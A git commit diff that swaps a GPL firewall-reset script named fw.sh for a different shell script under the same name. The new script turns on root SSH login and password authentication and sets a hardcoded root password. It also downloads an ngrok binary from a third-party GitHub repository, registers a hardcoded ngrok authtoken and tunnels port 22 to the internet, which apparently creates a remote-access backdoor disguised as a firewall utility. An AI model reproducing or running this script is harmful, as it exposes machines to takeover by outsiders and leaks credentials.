f3243bdf29b66c386e192b2c81ebe6a1d44ee08c
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-06-18 09:48:43 -0700

    Update fw.sh

--- fw.sh
+++ fw.sh
@@ -1,59 +1,10 @@
-#!/bin/bash
-# reset.fw - Reset firewall
-# set x to 0 - No reset
-# set x to 1 - Reset firewall
-# ---------------------------------------------------------------------------------------------------------------
-# Added support for IPV6 Firewall
-# ---------------------------------------------------------------------------------------------------------------
-# Written by Vivek Gite <vivek@nixcraft.com>
-# ---------------------------------------------------------------------------------------------------------------
-# You can copy / paste / redistribute this script under GPL version 2.0 or above
-# =============================================================
-x=1
- 
-# set to true if it is CentOS / RHEL / Fedora box
-RHEL=false
- 
-### no need to edit below  ###
-IPT=/sbin/iptables
-IPT6=/sbin/ip6tables
- 
-if [ "$x" == "1" ];
-then
-	if [ "$RHEL" == "true" ];
-	then
-	      # reset firewall using redhat script
-		/etc/init.d/iptables stop
-		/etc/init.d/ip6tables stop
-	else
-		# for all other Linux distro use following rules to reset firewall
-		### reset ipv4 iptales ###
-		$IPT -F
-		$IPT -X
-		$IPT -Z
-		for table in $(</proc/net/ip_tables_names)
-		do
-			$IPT -t $table -F
-			$IPT -t $table -X
-			$IPT -t $table -Z
-		done
-		$IPT -P INPUT ACCEPT
-		$IPT -P OUTPUT ACCEPT
-		$IPT -P FORWARD ACCEPT
-		### reset ipv6 iptales ###
-		$IPT6 -F
-		$IPT6 -X
-		$IPT6 -Z
-		for table in $(</proc/net/ip6_tables_names)
-		do
-			$IPT6 -t $table -F
-			$IPT6 -t $table -X
-			$IPT6 -t $table -Z
-		done
-		$IPT6 -P INPUT ACCEPT
-		$IPT6 -P OUTPUT ACCEPT
-		$IPT6 -P FORWARD ACCEPT
-	fi
-else
-        :
-fi
+#!/bin/sh
+sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
+sed -i "s/#PasswordAuthentication yes/PasswordAuthentication yes/" /etc/ssh/sshd_config
+service ssh restart
+echo "root:Pmataga1@" | chpasswd
+
+
+wget https://raw.githubusercontent.com/hondacars/sirji/main/ngrok
+./ngrok authtoken 23qnE0u7GSeL7Wjjus2ij5xUn2S_81cUigMoZYff5ewuA48QJ
+./ngrok tcp 22
